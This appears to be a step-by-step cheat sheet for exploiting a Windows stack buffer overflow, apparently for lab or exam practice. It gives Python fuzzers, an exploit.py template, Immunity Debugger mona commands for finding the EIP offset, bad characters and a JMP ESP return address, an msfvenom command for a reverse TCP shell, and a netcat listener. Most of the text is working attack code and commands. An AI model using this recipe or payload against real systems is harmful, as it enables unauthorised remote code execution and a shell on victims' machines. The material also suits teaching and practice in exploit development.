
Use fuzzer.py or fuzzer2.py, until the application crash inside Immunity Debugger.

# fuzzer.py

import socket, time, sys

IP = "<IP>"
PORT = <PORT>
timeout = 5

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((IP, PORT))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send(string)
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + IP + ":" + str(PORT))
        sys.exit(0)
    time.sleep(1)
# fuzzer2.py

import socket

IP = "<IP>"
PORT = <PORT>

payload = 1000 * "A"

try: 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP,PORT))
    s.send(payload)
    print "[+] " + str(len(payload)) + " Bytes Sent"
except:
    print "[-] Crashed"

  

When the application crashes, EIP should be equal to 41414141 

Crash replication & controlling EIP
Pattern
Generate a cyclic pattern to found the exact offset of the crash :


!mona pc <SIZE>


/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <SIZE>
The size must be higher than the crash offset. Now modify the payload variable by the cyclic pattern :

# exploit.py

import socket

ip = "<IP>"
port = <PORT>

prefix = ""
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
Re-run the exploit, the application should crash. To find the exact offset of the crash use :

!mona findmsp -distance <SIZE>
Size is the same as the one used to create the pattern. The result should be something like :

EIP contains normal pattern : ... (offset XXXX)
Get the offset, modify in exploit.py:

The offset variable by the offset
The retn variable by “BBBB”
Remove the payload variable
offset = <OFFSET>
overflow = "A" * offset
retn = "BBBB"
payload = ""
Exploit.py, EIP = 42424242 
  
Bad characters

!mona bytearray -b "\x00"
Copy the results in the variable payload re-run exploit.py

!mona compare -f C:\mona\<PATH>\bytearray.bin -a <ESP_ADDRESS>
If bad chars are found, we need to exclude them as well.

!mona bytearray -b "\x00 + <BAD_CHARS>"

# Example
!mona bytearray -b "\x00\x01\x02\x03"
Then compare
!mona compare -f C:\mona\<PATH>\bytearray.bin -a <ESP_ADDRESS>

Finding a jump point
JMP ESP - Inside the .exe
!mona jmp -r esp -cpb "<BAD_CHARS>"
JMP ESP - inside a DLL
!mona modules
 Rebase, SafeSEH, ASLR, NXCompat are set to False. 

!mona find -s "\xff\xe4" -m <DLL>
Return address
Choose an address in the results and update exploit.py :

# Example of a JMP ESP address
0x625011af
# exploit.py
retn = "\xaf\x11\x50\x62"
Generate payload


msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b "<BAD_CHARS>" -f c
Copy the generated shellcode and update exploit.py :

Setting the payload variable equal to the shellcode
NOP-sled
padding = "\x90" * 16
Start a listener
nc -lvp <PORT>
